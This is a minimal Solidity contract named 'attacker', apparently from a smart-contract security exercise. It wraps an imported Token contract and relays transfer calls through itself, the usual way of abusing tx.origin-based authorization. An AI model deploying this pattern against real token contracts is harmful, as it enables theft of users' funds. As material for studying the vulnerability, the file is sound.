// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./origin.sol";

contract attacker {

    Token public tokenContract;

    constructor (address _tokenAddress) public {
        tokenContract = Token(_tokenAddress);
    }

    function transfer(address _to, uint _value) public {
        tokenContract.transfer(_to, _value);
    }

}